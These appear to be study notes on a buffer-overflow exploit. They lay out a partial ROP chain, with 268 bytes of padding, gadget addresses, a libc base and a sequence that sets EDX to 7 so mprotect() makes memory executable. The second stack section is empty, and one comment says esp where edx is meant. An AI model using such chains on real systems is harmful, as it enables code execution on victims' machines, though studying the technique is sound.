# Using ROP chain to call mprotect with proper arguments:


* The goal here is to fill the stack with the addresses of gadgets, that we will use, in chain, to fill the registers used by mprotect() when it executes. I'll use the same values as those seen in the mprotect.md example. 
* We will fill the entire buffer with 268*A, then, 

## STACK 1:

- libc_base address             = 0xf7d75000
- `pop edx; ret;` gadget offset = 0x0003b4fc
--------------------------
A * 268
--------------------------
0xF7DB04FC                  <== `pop edx; ret` gadget
--------------------------
0xffffffff                  <== esp will contain 0xffffffff
--------------------------
0xF7E157F8                  <== `inc edx; ret` gadget, when it will be exec, EDX will contain 0 (ffffffff + 1 = 0)
--------------------------
0xF7E157F8
--------------------------
0xF7E157F8
--------------------------
0xF7E157F8
--------------------------
0xF7E157F8
--------------------------
0xF7E157F8
--------------------------
0xF7E157F8
--------------------------
0xF7E157F8                  <== EDX now contains 7 aka `rwx`
--------------------------

## STACK 2:
--------------------------

--------------------------

--------------------------

--------------------------

--------------------------

--------------------------

--------------------------

--------------------------

--------------------------
